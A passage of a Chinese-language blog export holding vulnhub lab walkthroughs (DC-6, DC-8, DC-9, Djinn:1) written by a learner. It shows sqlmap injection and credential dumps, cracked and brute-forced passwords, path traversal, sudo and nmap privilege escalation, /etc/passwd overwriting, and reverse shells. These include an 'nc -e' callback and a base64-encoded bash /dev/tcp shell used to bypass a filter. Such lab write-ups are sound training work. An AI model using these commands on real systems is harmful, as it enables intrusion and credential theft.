<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ls /home/mark/stuff -al</span><br><span class="line">total 12</span><br><span class="line">drwxr-xr-x 2 mark mark 4096 Apr 26  2019 .</span><br><span class="line">drwxr-xr-x 3 mark mark 4096 Apr 26  2019 ..</span><br><span class="line">-rw-r--r-- 1 mark mark  241 Apr 26  2019 things-to-do.txt</span><br></pre></td></tr></table></figure>
<p>里面直接写了用户名密码(…)</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat things*</span><br><span class="line">- Add new user: graham - GSo7isUM1D4 - done</span><br></pre></td></tr></table></figure>
<p>用ssh连接上去</p>
<h3 id="提权到jens"><a href="#提权到jens" class="headerlink" title="提权到jens"></a>提权到jens</h3><p>查看一下可以提权的程序</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br><span class="line">    (jens) NOPASSWD: /home/jens/backups.sh</span><br></pre></td></tr></table></figure>
<p>看一下这个文件的权限</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ls -al /home/jens</span><br><span class="line"></span><br><span class="line">-rwxrwxr-x 1 jens devs   61 Apr  9 16:37 backups.sh</span><br></pre></td></tr></table></figure>
<p>居然可写,那就把它里面改成<code>/bin/bash</code>,就能得到一个<code>jens</code>的shell</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">graham@dc-6:/home/jens$ cat backups.sh </span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"><span class="meta">#</span><span class="bash">tar -czf backups.tar.gz /var/www/html</span></span><br><span class="line">/bin/bash</span><br><span class="line">graham@dc-6:/home/jens$ sudo -u jens ./backups.sh </span><br><span class="line">jens@dc-6:~$ whoami</span><br><span class="line">jens</span><br></pre></td></tr></table></figure>

<h3 id="提权到root"><a href="#提权到root" class="headerlink" title="提权到root"></a>提权到root</h3><p>继续找能够提权的玩意</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br><span class="line">    (root) NOPASSWD: /usr/bin/nmap</span><br></pre></td></tr></table></figure>
<p>nmap 怎么提权啊?师傅的WP上面说用<code>nse</code>提权,所以创建一个脚本文件就行</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">jens@dc-6:~$ cat rooter </span><br><span class="line">os.execute(&quot;/bin/sh&quot;);</span><br><span class="line">jens@dc-6:~$ sudo nmap localhost --script=rooter</span><br><span class="line"></span><br><span class="line">Starting Nmap 7.40 ( https://nmap.org ) at 2020-04-09 17:22 AEST</span><br><span class="line">NSE: Warning: Loading &#x27;rooter&#x27; -- the recommended file extension is &#x27;.nse&#x27;.</span><br><span class="line"><span class="meta">#</span><span class="bash"> root</span></span><br></pre></td></tr></table></figure>
<p>这个终端不会有回显自己的字符,用<code>reset</code>命令重置终端就正常了</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span></span><br><span class="line">root@dc-6:/home/jens# whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>
<h3 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@dc-6:/home/jens# cat /root/</span><br><span class="line">.bash_history   .mysql_history  .profile        </span><br><span class="line">.bashrc         .nano/          theflag.txt     </span><br><span class="line">root@dc-6:/home/jens# cat /root/theflag.txt </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Yb        dP 888888 88     88         8888b.   dP&quot;Yb  88b 88 888888 d8b </span><br><span class="line"> Yb  db  dP  88__   88     88          8I  Yb dP   Yb 88Yb88 88__   Y8P </span><br><span class="line">  YbdPYbdP   88&quot;&quot;   88  .o 88  .o      8I  dY Yb   dP 88 Y88 88&quot;&quot;   `&quot;&#x27; </span><br><span class="line">   YP  YP    888888 88ood8 88ood8     8888Y&quot;   YbodP  88  Y8 888888 (8) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Congratulations!!!</span><br><span class="line"></span><br><span class="line">Hope you enjoyed DC-6.  Just wanted to send a big thanks out there to all those</span><br><span class="line">who have provided feedback, and who have taken time to complete these little</span><br><span class="line">challenges.</span><br><span class="line"></span><br><span class="line">If you enjoyed this CTF, send me a tweet via @DCAU7.</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>exploit</category>
        <category>DC</category>
      </categories>
      <tags>
        <tag>exploit</tag>
        <tag>wordpress</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub DC-8靶机</title>
    <url>//DC-8.html</url>
    <content><![CDATA[<p>vulnhub里的 DC-8 靶机</p>
<p>初学者难度</p>
<a id="more"></a>

<h1 id="DC-8"><a href="#DC-8" class="headerlink" title="DC-8"></a>DC-8</h1><h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@kali:/home/kali/ex# nmap -Pn 192.168.2.0/24</span><br><span class="line"></span><br><span class="line">Nmap scan report for 192.168.2.158</span><br><span class="line">Host is up (0.00018s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">80/tcp open  http</span><br><span class="line">MAC Address: 00:0C:29:D6:59:23 (VMware)</span><br></pre></td></tr></table></figure>



<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@kali:/home/kali/ex# nmap -Pn -A 192.168.2.158 -p0-65535</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 35:a7:e6:c4:a8:3c:63:1d:e1:c0:ca:a3:66:bc:88:bf (RSA)</span><br><span class="line">|   256 ab:ef:9f:69:ac:ea:54:c6:8c:61:55:49:0a:e7:aa:d9 (ECDSA)</span><br><span class="line">|_  256 7a:b2:c6:87:ec:93:76:d4:ea:59:4b:1b:c6:e8:73:f2 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd</span><br><span class="line">|_http-generator: Drupal 7 (http://drupal.org)</span><br><span class="line">| http-robots.txt: 36 disallowed entries (15 shown)</span><br><span class="line">| /includes/ /misc/ /modules/ /profiles/ /scripts/ </span><br><span class="line">| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt </span><br><span class="line">| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt </span><br><span class="line">|_/LICENSE.txt /MAINTAINERS.txt</span><br><span class="line">|_http-server-header: Apache</span><br><span class="line">|_http-title: Welcome to DC-8 | DC-8</span><br></pre></td></tr></table></figure>



<h2 id="http"><a href="#http" class="headerlink" title="http"></a>http</h2><img src="./DC-8/image-20200706175716586.png" alt="image-20200706175716586" style="zoom:50%;" />

<p>点击左侧的链接栏之后，上面的<code>url</code>出现了<code>?nid=1</code>，猜测存在<code>sql</code>注入</p>
<p>使用<code>?nid=1&#39; or 1=1</code> 探测，发现崩溃</p>
<img src="./DC-8/image-20200706175905686.png" alt="image-20200706175905686" style="zoom:50%;" />

<p>sql语句暴露，明显存在注入点</p>
<h2 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@kali:/home/kali/ex# sqlmap -u http://192.168.2.158/?nid=1</span><br><span class="line"></span><br><span class="line">sqlmap resumed the following injection point(s) from stored session:</span><br><span class="line">---</span><br><span class="line">Parameter: nid (GET)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: AND boolean-based blind - WHERE or HAVING clause</span><br><span class="line">    Payload: nid=1 AND 1411=1411</span><br><span class="line"></span><br><span class="line">    Type: error-based</span><br><span class="line">    Title: MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)</span><br><span class="line">    Payload: nid=1 AND (SELECT 2170 FROM(SELECT COUNT(*),CONCAT(0x71787a7071,(SELECT (ELT(2170=2170,1))),0x7171787871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)</span><br><span class="line"></span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: nid=1 AND (SELECT 6552 FROM (SELECT(SLEEP(5)))CMJv)</span><br><span class="line"></span><br><span class="line">    Type: UNION query</span><br><span class="line">    Title: Generic UNION query (NULL) - 1 column</span><br><span class="line">    Payload: nid=-8664 UNION ALL SELECT CONCAT(0x71787a7071,0x704978464268654b5753624b664c43695648527452644a6c6e78756d467852727a705a6648506d54,0x7171787871)-- -</span><br><span class="line">---</span><br></pre></td></tr></table></figure>



<p>确实存在注入点，开始注入</p>
<p>中间过程略</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@kali:/home/kali/ex# sqlmap -u http://192.168.2.158/?nid=1 -D d7db -T users -C name,pass --dump</span><br><span class="line"></span><br><span class="line">Database: d7db                                                                        </span><br><span class="line">Table: users</span><br><span class="line">[2 entries]</span><br><span class="line">+--------+---------------------------------------------------------+</span><br><span class="line">| name   | pass                                                    |</span><br><span class="line">+--------+---------------------------------------------------------+</span><br><span class="line">| admin  | $S$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z |</span><br><span class="line">| john   | $S$DqupvJbxVmqjr6cYePnx2A891ln7lsuku/3if/oRVZJaz5mKC2vF |</span><br><span class="line">+--------+---------------------------------------------------------+</span><br></pre></td></tr></table></figure>

<p>保存到文件中，使用<code>john</code> 破解，得到john的密码为<code>turtle</code></p>
<p>到 web的登陆界面去，找到登陆的后台<code>http://192.168.2.156/user</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.没开启简洁链接：</span><br><span class="line">    ?q&#x3D;user</span><br><span class="line">    index.php?q&#x3D;user</span><br><span class="line"></span><br><span class="line">2.开启简洁链接</span><br><span class="line">    &#x2F;user</span><br></pre></td></tr></table></figure>

<p>使用john的账户登陆，发现有地方可以edit</p>
<img src="./DC-8/image-20200706181126430.png" alt="image-20200706181126430" style="zoom:50%;" />



<img src="./DC-8/image-20200706181156986.png" alt="image-20200706181156986" style="zoom:50%;" />

<p>本地监听，在<code>contract us</code>界面随便写一点，然后submit，得到webshell</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/sbin/exim4</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/bin/ping</span><br><span class="line">/bin/su</span><br><span class="line">/bin/umount</span><br><span class="line">/bin/mount</span><br></pre></td></tr></table></figure>

<p>然后看的是exim 提权</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kali@kali:/var/www/html$ searchsploit exim</span><br></pre></td></tr></table></figure>

<img src="./DC-8/image-20200706181516266.png" alt="image-20200706181516266" style="zoom:50%;" />

<p>在kali中开启<code>apache2</code>，在靶机使用wget 获取文件</p>
<p>运行<code>./46996.sh -m netcat</code></p>
<blockquote>
<p>  -m setuid 不知道为啥不行，netcat倒是可以</p>
</blockquote>
<img src="./DC-8/image-20200706181705588.png" alt="image-20200706181705588" style="zoom:50%;" />

]]></content>
      <categories>
        <category>exploit</category>
        <category>DC</category>
      </categories>
      <tags>
        <tag>exploit</tag>
        <tag>sql-injection</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub DC-8靶机</title>
    <url>//DC-9.html</url>
    <content><![CDATA[<p>vulnhub里的 DC-8 靶机</p>
<p>初学者难度</p>
<a id="more"></a>

<h1 id=""><a href="#" class="headerlink" title=""></a></h1><h1 id="DC9"><a href="#DC9" class="headerlink" title="DC9"></a>DC9</h1><h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@kali:/home/kali/Desktop/postsql# nmap -Pn 192.168.2.0/24</span><br><span class="line"></span><br><span class="line">Nmap scan report for 192.168.2.160</span><br><span class="line">Host is up (0.00061s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE    SERVICE</span><br><span class="line">22/tcp filtered ssh</span><br><span class="line">80/tcp open     http</span><br></pre></td></tr></table></figure>



<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@kali:/home/kali/Desktop/postsql# nmap -Pn 192.168.2.160 -A -p0-65535</span><br><span class="line"></span><br><span class="line">PORT   STATE    SERVICE VERSION</span><br><span class="line">22/tcp filtered ssh</span><br><span class="line">80/tcp open     http    Apache httpd 2.4.38 ((Debian))</span><br><span class="line">|_http-server-header: Apache/2.4.38 (Debian)</span><br><span class="line">|_http-title: Example.com - Staff Details - Welcome</span><br><span class="line">MAC Address: 00:0C:29:2C:6E:29 (VMware)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Network Distance: 1 hop</span><br></pre></td></tr></table></figure>



<p>开启了<code>ssh</code> <code>http</code> 两个端口</p>
<h2 id="http"><a href="#http" class="headerlink" title="http"></a>http</h2><p>访问<code>http://192.168.2.160</code></p>
<p><img src="./DC-9/image-20200709131034952.png" alt="image-20200709131034952"></p>
<p>在<code>search</code> 页面抓包，</p>
<p><img src="./DC-9/image-20200709131119588.png" alt="image-20200709131119588"></p>
<p>觉得可能存在<code>sql注入</code>，上<code>sqlmap</code></p>
<p>由于是<code>post型</code>，先保存到文件</p>
<h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@kali:/home/kali/Desktop/postsql# sqlmap -r 1.txt </span><br><span class="line"></span><br><span class="line">sqlmap resumed the following injection point(s) from stored session:</span><br><span class="line">---</span><br><span class="line">Parameter: search (POST)</span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: search=a&#x27; AND (SELECT 5206 FROM (SELECT(SLEEP(5)))mBIG) AND &#x27;EUSQ&#x27;=&#x27;EUSQ</span><br><span class="line"></span><br><span class="line">    Type: UNION query</span><br><span class="line">    Title: Generic UNION query (NULL) - 6 columns</span><br><span class="line">    Payload: search=a&#x27; UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716a787671,0x66647275534a554379564a566644746a68634655465746746f764d4a496850544c4c7a4b4b696144,0x7171786271),NULL,NULL-- -</span><br></pre></td></tr></table></figure>

<p>可以注入，那继续</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">dbs:</span><br><span class="line">	[*] information_schema</span><br><span class="line">	[*] Staff</span><br><span class="line">	[*] users</span><br></pre></td></tr></table></figure>



<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@kali:/home/kali/Desktop/postsql# sqlmap -r 1.txt -D Staff,users --tables</span><br><span class="line"></span><br><span class="line">Database: Staff</span><br><span class="line">[2 tables]</span><br><span class="line">+--------------+</span><br><span class="line">| StaffDetails |</span><br><span class="line">| Users        |</span><br><span class="line">+--------------+</span><br><span class="line"></span><br><span class="line">Database: users</span><br><span class="line">[1 table]</span><br><span class="line">+--------------+</span><br><span class="line">| UserDetails  |</span><br><span class="line">+--------------+</span><br></pre></td></tr></table></figure>



<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@kali:/home/kali/Desktop/postsql# sqlmap -r 1.txt -D users -T UserDetails --columns</span><br><span class="line"></span><br><span class="line">+-----------+-----------------+</span><br><span class="line">| Column    | Type            |</span><br><span class="line">+-----------+-----------------+</span><br><span class="line">| id        | int(6) unsigned |</span><br><span class="line">| password  | varchar(20)     |</span><br><span class="line">| firstname | varchar(30)     |</span><br><span class="line">| lastname  | varchar(30)     |</span><br><span class="line">| reg_date  | timestamp       |</span><br><span class="line">| username  | varchar(30)     |</span><br><span class="line">+-----------+-----------------+</span><br></pre></td></tr></table></figure>



<img src="DC-9/image-20200709132217205.png" alt="image-20200709132217205" style="zoom:50%;" />



<h2 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h2><p>尝试ssh连接上去，却失败了。</p>
<img src="DC-9/image-20200709132316634.png" alt="image-20200709132316634" style="zoom:50%;" />



<p>看到上面端口扫描的时候，ssh显示的<code>filered</code></p>
<p>然后就是翻了一下别人的wp</p>
<img src="DC-9/image-20200709132537229.png" alt="image-20200709132537229" style="zoom:50%;" />

<p>也就是说需要先读到这个文件。</p>
<h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><p>回到sql，还有一张表没有看。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@kali:/home/kali/Desktop/postsql# sqlmap -r 1.txt -D Staff -T Users --columns</span><br><span class="line"></span><br><span class="line">+----------+-----------------+</span><br><span class="line">| Column   | Type            |</span><br><span class="line">+----------+-----------------+</span><br><span class="line">| Password | varchar(255)    |</span><br><span class="line">| UserID   | int(6) unsigned |</span><br><span class="line">| Username | varchar(255)    |</span><br><span class="line">+----------+-----------------+</span><br></pre></td></tr></table></figure>



<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@kali:/home/kali/Desktop/postsql# sqlmap -r 1.txt -D Staff -T Users -C Username,Password --dump</span><br><span class="line"></span><br><span class="line">[INFO] recognized possible password hashes in column &#x27;`Password`&#x27;</span><br></pre></td></tr></table></figure>

<p>是一个hash，使用sqlmap自带的爆破功能</p>
<p><img src="DC-9/image-20200709131623559.png" alt="image-20200709131623559"></p>
<p>得到了admin的密码，回到http</p>
<img src="DC-9/image-20200709131749113.png" alt="image-20200709131749113" style="zoom:50%;" />

<p>左下角出现<code>File does not exist</code>，猜测是文件包含漏洞</p>
<p>使用<code>?file=../../../../../etc/passwd</code>试试（中间../多一点没关系）</p>
<img src="DC-9/image-20200709131916088.png" alt="image-20200709131916088" style="zoom:50%;" />

<p>（图中最后的stdout是我后来提权的时候写上去的）</p>
<p>利用这个漏洞，读到<code>/etc/knockd.conf</code>文件，</p>
<img src="DC-9/image-20200709132726736.png" alt="image-20200709132726736" style="zoom:50%;" />

<p>需要先敲门这三个端口</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@kali:/home/kali/Desktop/postsql# nmap -p7469 192.168.2.160</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-09 01:28 EDT</span><br><span class="line">Nmap scan report for 192.168.2.160</span><br><span class="line">Host is up (0.00037s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE  SERVICE</span><br><span class="line">7469/tcp closed unknown</span><br><span class="line">MAC Address: 00:0C:29:2C:6E:29 (VMware)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 0.22 seconds</span><br><span class="line">root@kali:/home/kali/Desktop/postsql# nmap -p8475 192.168.2.160</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-09 01:28 EDT</span><br><span class="line">Nmap scan report for 192.168.2.160</span><br><span class="line">Host is up (0.00043s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE  SERVICE</span><br><span class="line">8475/tcp closed unknown</span><br><span class="line">MAC Address: 00:0C:29:2C:6E:29 (VMware)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 0.21 seconds</span><br><span class="line">root@kali:/home/kali/Desktop/postsql# nmap -p9842 192.168.2.160</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-09 01:28 EDT</span><br><span class="line">Nmap scan report for 192.168.2.160</span><br><span class="line">Host is up (0.00051s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE  SERVICE</span><br><span class="line">9842/tcp closed unknown</span><br><span class="line">MAC Address: 00:0C:29:2C:6E:29 (VMware)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 0.23 seconds</span><br><span class="line">root@kali:/home/kali/Desktop/postsql# nmap 192.168.2.160 -p22</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-09 01:28 EDT</span><br><span class="line">Nmap scan report for 192.168.2.160</span><br><span class="line">Host is up (0.00042s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">MAC Address: 00:0C:29:2C:6E:29 (VMware)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 0.20 seconds</span><br></pre></td></tr></table></figure>

<p>发现22端口的ssh open了</p>
<p>使用ssh连，发现不对</p>
<img src="DC-9/image-20200709133024619.png" alt="image-20200709133024619" style="zoom:50%;" />

<p>猜测可能是后来修改过密码，尝试爆破，看看有没有没修改密码的漏网之鱼</p>
<h2 id="hydra"><a href="#hydra" class="headerlink" title="hydra"></a>hydra</h2><p>把user 和 passwd 分别放入两个文件中，使用hydra工具爆破</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kali@kali:~/DC9$ hydra -L user.txt -P passwd.txt 192.168.2.160 ssh</span><br><span class="line"></span><br><span class="line">[22][ssh] host: 192.168.2.160   login: chandlerb   password: UrAG0D!</span><br><span class="line">[22][ssh] host: 192.168.2.160   login: joeyt   password: Passw0rd</span><br><span class="line">[22][ssh] host: 192.168.2.160   login: janitor   password: Ilovepeepee</span><br></pre></td></tr></table></figure>

<p>找到三个，连接上去</p>
<img src="DC-9/image-20200709133429774.png" alt="image-20200709133429774" style="zoom:50%;" />

<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>在遍历了前面两个账户之后，并没有发现有用的信息</p>
<p>但是第三个有</p>
<img src="DC-9/image-20200709133601007.png" alt="image-20200709133601007" style="zoom:50%;" />

<img src="DC-9/image-20200709133614969.png" alt="image-20200709133614969" style="zoom:50%;" />

<p>应该是别人的密码，加到passwd.txt 里面，再一次爆破</p>
<p>发现多了一条</p>
<img src="DC-9/image-20200709133724745.png" alt="image-20200709133724745" style="zoom:50%;" />

<p>使用这个新的登陆</p>
<p>使用<code>sudo -l</code> </p>
<img src="DC-9/image-20200709133816001.png" alt="image-20200709133816001" style="zoom:50%;" />

<p>应该就是要用这个了，这个是一个二进制文件，然后怎么办我就不知道了</p>
<p>（偷看参考答案，说是运行了一个<code>../../test.py</code>，但是为什么呢？）</p>
<p><img src="DC-9/image-20200709133947723.png" alt="image-20200709133947723"></p>
<p>反正就是能以root方式写文件了</p>
<p>那就写<code>/etc/passwd</code>呗</p>
<p>使用<code>openssl</code>工具生成一个</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ openssl passwd -1 -salt stdout 1111</span><br><span class="line"><span class="meta">$</span><span class="bash">1$stdout<span class="variable">$FfWrpUtX8XO1tpysFmaKg</span>/</span></span><br></pre></td></tr></table></figure>

<p>然后把这个echo到/tmp文件夹下面</p>
<p>使用test文件修改<code>/etc/passwd</code>,切换到stdout就可以了</p>
<img src="DC-9/image-20200709134219093.png" alt="image-20200709134219093" style="zoom:50%;" />

]]></content>
      <categories>
        <category>exploit</category>
        <category>DC</category>
      </categories>
      <tags>
        <tag>exploit</tag>
        <tag>sql-injection</tag>
        <tag>file-including</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub Djinn:1靶机</title>
    <url>//Djinn-1.html</url>
    <content><![CDATA[<p>vulnhub里的 Djinn:1 靶机</p>
<p>中等难度</p>
<a id="more"></a>



<h1 id="Djinn-1"><a href="#Djinn-1" class="headerlink" title="Djinn:1"></a>Djinn:1</h1><img src="./Djinn:1/image-20200718152057202.png" alt="image-20200718152057202" style="zoom:25%;" />

<p>扫描之后发现开启了 <code>21,22,1337,7331</code>四个端口</p>
<p>其中 ssh 处于 <code>filtered</code> 状态</p>
<h2 id="1337端口"><a href="#1337端口" class="headerlink" title="1337端口"></a>1337端口</h2><p>是一个小游戏</p>
<img src="Djinn:1/image-20200718152159308.png" alt="image-20200718152159308" style="zoom:25%;" />



<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">&quot;192.168.2.170&quot;</span>, <span class="number">1337</span>)</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">sh.recvuntil(<span class="string">&quot;gift.&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">function</span>(<span class="params">arg1, arg2, case</span>):</span></span><br><span class="line">	<span class="keyword">if</span> (case == <span class="string">&quot;+&quot;</span>):</span><br><span class="line">		<span class="keyword">return</span> arg1 + arg2</span><br><span class="line">	<span class="keyword">elif</span> (case == <span class="string">&quot;-&quot;</span>):</span><br><span class="line">		<span class="keyword">return</span> arg1 - arg2</span><br><span class="line">	<span class="keyword">elif</span> (case == <span class="string">&quot;*&quot;</span>):</span><br><span class="line">		<span class="keyword">return</span> arg1 * arg2</span><br><span class="line">	<span class="keyword">elif</span> (case == <span class="string">&quot;/&quot;</span>):</span><br><span class="line">		<span class="keyword">return</span> arg1 / arg2</span><br><span class="line">	<span class="keyword">else</span> :</span><br><span class="line">		print(<span class="string">&quot;case: &quot;</span>, case)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1001</span>):</span><br><span class="line">	sh.recvuntil(<span class="string">&quot;(&quot;</span>)</span><br><span class="line">	arg1 = <span class="built_in">int</span>(sh.recvuntil(<span class="string">&quot;,&quot;</span>)[:-<span class="number">1</span>])</span><br><span class="line">	sh.recvuntil(<span class="string">&quot;\&#x27;&quot;</span>)</span><br><span class="line">	case = sh.recv(<span class="number">1</span>)</span><br><span class="line">	sh.recvuntil(<span class="string">&quot; &quot;</span>)</span><br><span class="line">	arg2 = <span class="built_in">float</span>(sh.recvuntil(<span class="string">&quot;)&quot;</span>)[:-<span class="number">1</span>])</span><br><span class="line">	ans = function(arg1, arg2, case)</span><br><span class="line">	<span class="comment">#print(&quot;ans: &quot;, ans)</span></span><br><span class="line">	sh.sendline(<span class="built_in">str</span>(ans))</span><br><span class="line">	</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<p>使用<code>pwntools</code>编写exp，得到结果</p>
<img src="Djinn:1/image-20200718152949625.png" alt="image-20200718152949625" style="zoom:25%;" />

<p>我猜是端口敲门服务，但是并不是，敲了门之后ssh反而close了（会不会是我敲门的操作不对）</p>
<h2 id="ftp"><a href="#ftp" class="headerlink" title="ftp"></a>ftp</h2><p>观察到ftp端口扫描的结果，直接出现了文件的名字，并且允许匿名登陆。</p>
<img src="Djinn:1/image-20200718153356511.png" alt="image-20200718153356511" style="zoom:25%;" />

<p>匿名登陆之后，下载三个文件看看</p>
<img src="Djinn:1/image-20200718153542804.png" alt="image-20200718153542804" style="zoom:25%;" />



<h2 id="7331"><a href="#7331" class="headerlink" title="7331"></a>7331</h2><p>是一个http端口</p>
<img src="Djinn:1/image-20200718153726596.png" alt="image-20200718153726596" style="zoom:25%;" />

<p>扫描一下，得到两个目录<code>/wish</code>和<code> /genie</code></p>
<img src="Djinn:1/image-20200718173347887.png" alt="image-20200718173347887" style="zoom:25%;" />

<p>输入ls，得到的页面出现了目录列表</p>
<img src="Djinn:1/image-20200718173841552.png" alt="image-20200718173841552" style="zoom:25%;" />

<img src="Djinn:1/image-20200718173851608.png" alt="image-20200718173851608" style="zoom:25%;" />

<p>试试弹一个webshell</p>
<p><code>nc -e /bin/bash 192.168.2.143 8848</code></p>
<img src="Djinn:1/image-20200718173946396.png" alt="image-20200718173946396" style="zoom:25%;" />

<p>应该是做了过滤，不懂怎么绕过</p>
<p>（翻参考答案去了）</p>
<h2 id="使用base64绕过"><a href="#使用base64绕过" class="headerlink" title="使用base64绕过"></a>使用base64绕过</h2><img src="Djinn:1/image-20200718191903547.png" alt="image-20200718191903547" style="zoom:25%;" />



<p>然后在execute里面输入<code>echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIuMTQzLzg4NDggMD4mMQ== | base64 -d | bash</code> 即可得到一个反弹shell</p>
<img src="Djinn:1/image-20200718192017136.png" alt="image-20200718192017136" style="zoom:25%;" />



<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>查看一下<code>/home</code></p>
<img src="Djinn:1/image-20200718192113475.png" alt="image-20200718192113475" style="zoom:25%;" />

<p>发现<code>nitush</code>是可以读的，下面有一个<code>user.txt</code>，但是读不了，只有<code>.dev(目录)</code> 和<code>.bashrc(文件)</code>是可以读的，看一下<code>.dev</code>里面有啥</p>
